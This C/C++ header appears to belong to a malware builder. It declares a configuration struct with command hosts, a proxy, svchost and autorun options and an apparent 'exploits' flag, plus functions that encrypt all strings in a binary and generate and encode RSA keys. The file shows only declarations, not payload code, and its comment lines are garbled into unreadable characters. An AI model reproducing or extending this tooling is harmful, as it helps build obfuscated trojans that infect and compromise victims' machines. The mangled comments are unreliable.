#include "builder.h" //��������� ���� ��� �������
#include "core\core.h"

struct Config
{
	StringBuilder prefix;
	StringArray hosts;
	StringBuilder proxy;
	StringArray hosts_az;
	StringBuilder user_az;
	StringArray video_hosts;
	bool video_svchost;
	bool video_run; 
	int video_timeout;
	bool autorun;
	bool sployty;
	bool check_dublication;
	bool plugins_server;
	bool not_used_svchost;

	StringBuilder password;
	int period;
	byte RandVector[MaxSizeRandVector];
	uint A, B, R; //A B ������������ ���������� ��������� �����, R ������� �������� ���������� �����
	Mem::Data publicKey, privateKey, encodedKey;
	StringBuilder dateWork;
};

Config* ReadConfig( const char* fileName );
bool SetConfig( Config* cfg, Mem::Data& data );
//��������� ������� �������������, ������������ ��� ����������� �����
void CreateEncodeTable( Config* cfg );
//����������� ����� ����������� ��������� CS...ES, ���������� ���������� �������������� �����
int EncodeAllStrings( Config* cfg, Mem::Data& data );
//����������� ������ s, ��������� ���������� � buf, ������ buf ������ ���� ����������� (����� ����� ������ + CountStringOpcode + \0)
int EncodeString( const char* s, char* buf, int c_s = -1 );
void SetRandVector( Config* cfg, Mem::Data& data );
bool GenRSAKeys( Mem::Data& publicKey, Mem::Data& privateKey );
void EncodeRSAKey( Mem::Data& key, Mem::Data& res );